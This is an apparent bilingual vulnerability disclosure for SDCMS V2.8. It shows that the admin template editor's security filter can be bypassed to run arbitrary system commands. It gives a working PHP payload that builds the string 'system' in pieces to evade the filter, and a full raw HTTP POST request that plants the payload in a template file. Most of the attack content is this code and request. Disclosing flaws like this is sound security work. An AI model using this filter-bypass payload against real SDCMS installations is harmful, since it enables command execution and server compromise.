---
tags:
  - 漏洞公开
---
# SDCMS V2.8 commnd execution
*SDCMS V2.8命令执行*
## Environment
*环境*
V2.8
![[Pasted image 20241009135524.png]]
https://www.sdcms.cn/cms.html
## Analysis
*分析*
There is a hidden danger in the security filtering method of template content in app\\admin\\controller\\theme.php, which can cause arbitrary command execution through code injection.
*\\app\\admin\\controller\\theme.php中对模板内容安全过滤方式存在隐患，可通过代码注入造成任意命令执行*

![[Pasted image 20241009141106.png]]

![[Pasted image 20241009141146.png]]
## Verify
*证明*
In the backend template plugin ->template management, add code.
*在后台模板插件->模板管理，添加代码*
```php
{php $a='s'.'yst'.'em'; $b='dir'; $a($b);}
```
You can bypass code security verification and execute commands.
*即可绕过代码安全校验，实现命令执行*
![[Pasted image 20241009141545.png]]
Successfully saved
*成功保存*
![[Pasted image 20241009141715.png]]
```http
POST /?m=admin&c=theme&a=edit&root=ZTE3MWlQeSt1STBoNzM1WHJ5L05JYjBsZktMZU1HUHB1ZUtxRDBrWWZMMnZxcmY4Z0FPMmZtdmNuV3M= HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1908
Origin: http://localhost
Connection: close
Referer: http://localhost/?m=admin&c=theme&a=edit&root=ZTE3MWlQeSt1STBoNzM1WHJ5L05JYjBsZktMZU1HUHB1ZUtxRDBrWWZMMnZxcmY4Z0FPMmZtdmNuV3M%3D
Cookie: iconSize=16x16; jenkins-timestamper-offset=-28800000; PHPSESSID=fv6b5117hu9kv7fbepjs9ie1n2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

file=2020%2Fcity.php&t0=OTMzZDIrVkJDWUZkTzVZYm1LRFNxei9OSTVFWlZZTGlCZmh2ajI3NUFkQzZ1aDJNaEhMZFhaTXM5U1U%3D&t1=%E5%9F%8E%E5%B8%82%E5%88%86%E7%AB%99&t2=%7Bphp+%24self_name%3D'%E5%9F%8E%E5%B8%82%E5%88%86%E7%AB%99'%7D%0D%0A%7Bphp+%24self_ename%3D'city'%7D%0D%0A%7Bphp+%24position%3D%5B%5B'name'%3D%3E%24self_name%2C'url'%3D%3ETHIS_LOCAL%5D%5D%7D%0D%0A%7Binclude+file%3D%22include%2Ftop.php%22%7D%0D%0A%3Ctitle%3E%7B%24self_name%7D_%7Bsdcms%5Bweb_name%5D%7D%3C%2Ftitle%3E%0D%0A%3Cmeta+name%3D%22keywords%22+content%3D%22%7Bsdcms%5Bseo_key%5D%7D%22%3E%0D%0A%3Cmeta+name%3D%22description%22+content%3D%22%7Bsdcms%5Bseo_desc%5D%7D%22%3E%0D%0A%3C%2Fhead%3E%0D%0A%0D%0A%3Cbody%3E%0D%0A{php+$a='s'.'yst'.'em';+$b='dir';+$a($b);}%0D%0A%09%7Binclude+file%3D%22include%2Fhead.php%22%7D%0D%0A%09%7Binclude+file%3D%22include%2Fbanner_inner.php%22%7D%0D%0A%0D%0A%09%3Cdiv+class%3D%22container%22%3E%0D%0A%09%09%3Cdiv+class%3D%22width+ui-row%22%3E%0D%0A%09%09%09%3Cdiv+class%3D%22container-left%22%3E%0D%0A%09%09%09%09%3Cdiv+class%3D%22ui-fixed-s%22+data-parent%3D%22.container%22%3E%0D%0A%09%09%09%09%09%7Binclude+file%3D%22include%2Fleft_nav.php%22%7D%0D%0A%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%0D%0A%09%09%09%3Cdiv+class%3D%22container-right%22%3E%0D%0A%09%09%09%0D%0A%09%09%09%09%3Cdiv+class%3D%22ui-box%22%3E%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22ui-box-h2%22%3E%7B%24self_name%7D%3C%2Fdiv%3E%0D%0A%09%09%09%09%09%3Cdiv+class%3D%22ui-box-body%22%3E%0D%0A%09%09%09%09%09%09%3C!--begin--%3E%0D%0A%09%09%09%09%09%09%7Binclude+file%3D%22include%2Fcity.php%22%7D%0D%0A%09%09%09%09%09%09%3C!--over--%3E%0D%0A%09%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%09%0D%0A%09%09%09%3C%2Fdiv%3E%0D%0A%09%09%3C%2Fdiv%3E%0D%0A%09%3C%2Fdiv%3E%0D%0A%09%0D%0A%09%7Binclude+file%3D%22include%2Ffoot.php%22%7D%0D%0A%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E&token=b3b54c27848b1a21c0e3773559fccfe0
```
Visit vulnerability page.
*访问漏洞页面*
![[Pasted image 20241009141812.png]]